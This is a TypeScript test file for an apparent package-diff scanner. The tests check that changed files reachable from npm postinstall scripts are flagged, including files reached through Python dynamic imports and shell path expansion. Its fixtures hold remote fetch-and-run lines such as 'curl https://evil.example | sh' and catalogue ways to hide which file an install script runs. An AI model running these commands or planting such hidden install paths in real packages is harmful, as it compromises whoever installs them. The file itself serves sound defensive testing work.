import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";
const pyc = "\x00\x00\x00\x00junk";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});

// import_module, __import__, run_module, and run_path shadow the named file
// with any receiver. A directory tail stays in that directory only when this
// file assigns the name and no value contains / or ...
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["P1 py from importlib import import_module", pyE("from importlib import import_module\nimport_module('json')\n", "json.pyc"), "json.pyc", pyc, true],
  ["P2 py import_module alias call", pyE("from importlib import import_module as im\nim('json')\n", "json.pyc"), "json.pyc", pyc, false],
  ["P3 py importlib alias module", pyE("import importlib as il\nil.import_module('json')\n", "json.pyc"), "json.pyc", pyc, true],
  ["P4 py getattr import_module", pyE("import importlib\ngetattr(importlib, 'import_module')('json')\n", "json.pyc"), "json.pyc", pyc, false],
  ["P5 py builtins.__import__", pyE("import builtins\nbuiltins.__import__('json')\n", "json.pyc"), "json.pyc", pyc, true],
  ["P6 py __import__ unlisted non-stdlib dir", pyE("__import__('helperpkg')\n", "helperpkg/__init__.py"), "helperpkg/__init__.py", py, true],
  ["P7 py import_module var", pyE("import importlib\nn = 'json'\nimportlib.import_module(n)\n", "json.pyc"), "json.pyc", pyc, false],
  ["P8 py __import__ dotted", pyE("__import__('email.message')\n", "email/message.py"), "email/message.py", py, true],
  ["P9 py runpy.run_module", pyE("import runpy\nrunpy.run_module('helper')\n", "helper.pyc"), "helper.pyc", pyc, true],
  ["P10 py exec import string", pyE("exec('import json')\n", "json.pyc"), "json.pyc", pyc, false],
  ["P11 sh ./tools/$N.sh traversal", shE("N=../docs/run\n./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["P12 sh ./$X into subdir", shE("X=docs/run.sh\n./$X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["P13 sh tools/$X nested", shE("X=sub/run.sh\nsh tools/$X\n", "tools/sub/run.sh"), "tools/sub/run.sh", sh, false],
  ["P14 sh ${D}/run.sh", shE("D=docs\n${D}/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["P15 sh quoted $D/run.sh", shE("D=docs\n\"$D\"/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["P16 sh ./tools/${N}.sh traversal", shE("N=../docs/run\n./tools/${N}.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["P17 sh $PWD/docs/run.sh", shE("$PWD/docs/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["P18 sh source ./tools/$N.sh traversal", shE("N=../docs/run\n. ./tools/$N.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}

test("run_path of a literal name shadows the same files as __import__", () => {
  const base = pyE("import runpy\nrunpy.run_path('helper')\n", "helper.pyc");
  holds(base, "helper.pyc", pyc);
  expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
});

test("an unassigned name under a directory reaches every file", () => {
  const base = shE("./tools/$N.sh\n", "docs/run.sh");
  holds(base, "docs/run.sh", sh);
  expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
});

test("N=run keeps ./tools/$N.sh on that directory", () => {
  const base = shE("N=run\n./tools/$N.sh\n", "tools/run.sh");
  holds(base, "tools/run.sh", sh);
  expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
});
